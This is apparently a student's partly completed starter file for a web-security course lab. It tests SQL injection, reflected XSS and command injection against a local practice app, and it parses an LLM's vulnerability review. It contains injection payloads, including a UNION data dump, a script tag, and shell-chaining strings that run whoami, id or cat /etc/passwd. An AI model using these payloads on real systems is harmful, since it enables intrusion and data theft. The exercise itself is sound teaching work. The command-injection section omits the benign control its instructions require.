"""Week 6 studio — starter (web injection + the LLM-vs-scanner duel).

Fill in the functions below, then run ``python3 test_studio.py``. All provided
tests must pass, INCLUDING the guarantee test that watches the classical scanner
MISS the SQLi and neither arm cleanly find Broken Access Control — because the
vulnerability class automated tools are worst at is exactly OWASP-2021 #1, and a
lesson you can watch fail as a test is one you actually understood.

The one idea (from Session 6A): every injection is the same bug — untrusted data
crosses into a control channel (SQL / HTML / a shell). And the discipline (axis 3):
a finding is NOT real until a SOUND ORACLE confirms a security-relevant effect. A
reflected string is not XSS; a canary leak IS SQLi.

Everything runs laptop-only against 127.0.0.1 (webharness brings the app up
in-process — no Docker). Nothing here touches a network you were not authorized
to test; see ../../resources/ethics-and-scope.md.
"""

from __future__ import annotations

import json as _json

from seclab.attack import Payload, Finding, run_payloads, contains_oracle
from seclab.scan import ScanResult

from webharness import (get, login_send, reflect_send, reflect_safe_send, ping_send,
                        RULE_ALIASES)


# ============================================================================
# TASK 1 — three oracle-confirmed findings against the running vuln-web app
# ============================================================================
# For each sink: build the payload(s), wire them through seclab.attack with a
# SOUND oracle, and return the Findings. Include a benign control (family="benign")
# so you can prove your oracle does NOT fire on legitimate input — a false positive
# in your tooling poisons every number in your report.

def confirm_sqli() -> list[Finding]:
    """SQL injection at /login. Confirm by EXTRACTING DATA, not by "the page looked
    different": leak the admin canary ``FLAG-sqli-...``.

    Build payloads in the USERNAME field (password is a throwaway):
      - an auth-bypass, e.g.  admin' OR '1'='1
      - a comment-out,  e.g.  admin'--
      - a UNION dump that pulls the secret column (the strongest proof)
      - a benign control: family="benign", a real user + the wrong password
    Then run them with ``run_payloads(payloads, send=login_send, oracle=...)``.
    Use ``contains_oracle("FLAG-sqli-")`` — it confirms only if the canary comes
    back (an exfiltrated row), NOT if the payload is merely echoed.

    Return the list of Findings.
    """
    # TODO: build the payloads (incl. a benign control) and run_payloads with a
    #       canary oracle; return the Findings.

    payloads = [
        Payload("admin' OR '1'='1", intent="auth-bypass", family="sqli"),
        Payload("admin'--", intent="comment-out", family="sqli"),
        Payload("' UNION SELECT user, secret FROM users--", intent="union-dump", family="sqli"),
        Payload("admin", intent="benign-control", family="benign"),
    ]
    
    return run_payloads(payloads, send=login_send, oracle=contains_oracle("FLAG-sqli-"))


def confirm_xss() -> tuple[Finding, Finding]:
    """Reflected XSS at ``/?name=`` — and the true negative at ``/safe?name=``.

    The oracle is the crux of the week: a reflected string is only XSS if it would
    EXECUTE. You can't run a browser here, so the sound necessary condition is that
    the ``<script>`` survives UNescaped in the response (an un-encoded ``<script>``,
    NOT ``&lt;script&gt;``). Merely coming back in the body is reflection, not XSS.

    Fire the SAME payload at both endpoints and return ``(vuln_finding,
    safe_finding)``. The vulnerable ``/`` must confirm; the fixed ``/safe``
    (html.escape) must NOT — that is the true negative you carry into the duel.

    Write your own oracle ``xss_oracle(payload, response) -> (bool, str)``; do not
    reuse ``contains_oracle`` here (the payload IS the marker, so it would confirm
    mere reflection — the exact false positive this task is about).
    """
    # TODO: define xss_oracle (unescaped <script> present), pick a marker payload
    #       such as "<script>alert('XSS-FIRED-7f3a')</script>", run it against
    #       reflect_send and reflect_safe_send, and return (vuln_f, safe_f).
    def xss_oracle(payload, response):
            # Sound necessary condition for execution: the <script> tag survives
            # UNescaped. If it came back as &lt;script&gt; (html.escape'd) it cannot
            # execute -> that is reflection, not XSS, and must NOT confirm.
            unescaped = "<script>" in response
            escaped = "&lt;script&gt;" in response
            hit = unescaped and not escaped
            return hit, ("unescaped <script> survived in the response" if hit
                        else "no unescaped <script> (escaped or absent)")

    marker = "<script>alert('XSS-FIRED-7f3a')</script>"
    payload = [Payload(marker, intent="reflected-xss", family="xss",
                       note="unescaped <script> in the response = would execute")]

    vuln_f = run_payloads(payload, send=reflect_send, oracle=xss_oracle)[0]
    safe_f = run_payloads(payload, send=reflect_safe_send, oracle=xss_oracle)[0]
    return vuln_f, safe_f


def confirm_cmdi() -> list[Finding]:
    """Command injection at /ping. A shell metacharacter (``;`` ``&&`` ``|`` ...)
    smuggles a second command past ``ping -c 1 <host>``. The lab SIMULATES
    execution (it reports ``injection_detected``) so it is safe to run, but the bug
    — untrusted data reaching a command context — is real and confirmable.

    Sound oracle: parse the JSON response and confirm on ``injection_detected is
    True`` (a metacharacter reached the command), NOT on the string being echoed.
    Include a benign control (a plain host with no metacharacters) that must NOT
    confirm. Return the Findings.
    """
    # TODO: define cmdi_oracle (json injection_detected True), build payloads incl.
    #       a benign control, run_payloads with ping_send, return the Findings.
    def cmdi_oracle(payload, response):
        # Sound oracle: a shell metacharacter actually reached the command
        # context (injection_detected), NOT just that the host was echoed back.
        try:
            data = _json.loads(response)
        except _json.JSONDecodeError:
            return False, "non-JSON response"
        hit = data.get("injection_detected") is True
        return hit, (f"metacharacter reached command: {data.get('would_run')!r}"
                     if hit else "no shell metacharacter in host")

    payloads = [
        Payload("127.0.0.1; whoami", intent="chain-with-semicolon", family="cmdi"),
        Payload("127.0.0.1 && id", intent="chain-with-and", family="cmdi"),
        Payload("127.0.0.1 | cat /etc/passwd", intent="pipe", family="cmdi"),
        Payload("$(whoami)", intent="command-substitution", family="cmdi")
    ]

    return run_payloads(payloads, send=ping_send, oracle=cmdi_oracle)


# ============================================================================
# TASK 2 — the duel: parse the LLM arm's output into ScanResults
# ============================================================================
# The CLASSICAL arm (webharness.regex_scanner) and the GROUND TRUTH
# (webharness.load_ground_truth, reused from the Duel-2 fixture) are GIVEN. Your
# job is the LLM arm: turn a model's free-text review into structured ScanResults
# so seclab.scan can score it the same way as the scanner. In the studio the raw
# text comes from seclab.LLM; here (and in the tests) it is webharness.RAW_LLM_REVIEW.

def parse_llm_review(raw: str) -> list[ScanResult]:
    """Parse a model's free-text vulnerability review into ScanResults.

    Each finding line looks like:
        "1. [HIGH] SQL Injection in do_login: ..."
    Extract, for each line that names a vulnerability at a location:
      - the RULE: map the prose name to a canonical rule via ``RULE_ALIASES``
        (e.g. "SQL Injection" -> "sqli", "Broken Access Control" ->
        "broken-access-control").
      - the LOCATION: the ``do_<name>`` function it points at (regex ``do_\\w+``).
      - severity/confidence if present (optional; the key() ignores them).

    Return one ``ScanResult(rule=..., location=..., tool="llm", ...)`` per finding.
    Do NOT filter out the suspicious ones — parse the model faithfully, including
    its Broken-Access-Control claim and its finding on ``do_reflect_safe``. Whether
    those are real is decided by scoring against the ground truth, not by you.
    """
    # TODO: scan each line for a RULE_ALIASES key and a do_<name> location; emit a
    #       ScanResult per finding. Return the list.
    raise NotImplementedError


# ============================================================================
# Task 3 (Control Scorecard + disclosure note) is prose — see README.md.
# ============================================================================


if __name__ == "__main__":
    from seclab.attack import print_summary
    from seclab.scan import compare_scanners, print_comparison
    from webharness import regex_scanner, RAW_LLM_REVIEW, SOURCE, load_ground_truth

    for name, fn in [("SQLi", confirm_sqli), ("cmdi", confirm_cmdi)]:
        try:
            print(f"\n== {name} ==")
            print_summary(fn())
        except NotImplementedError:
            print(f"  {name}: not implemented yet")

    try:
        vuln_f, safe_f = confirm_xss()
        print("\n== XSS ==")
        print("  vulnerable / :", "CONFIRMED" if vuln_f.confirmed else "no effect")
        print("  fixed /safe  :", "CONFIRMED" if safe_f.confirmed else "no effect",
              "(true negative)")
    except NotImplementedError:
        print("\n  XSS: not implemented yet")

    try:
        llm = parse_llm_review(RAW_LLM_REVIEW)
        print("\n== Duel ==")
        print_comparison(compare_scanners(
            {"regex-scanner": regex_scanner(SOURCE), "llm": llm},
            load_ground_truth()))
    except NotImplementedError:
        print("\n  Duel: parse_llm_review not implemented yet")
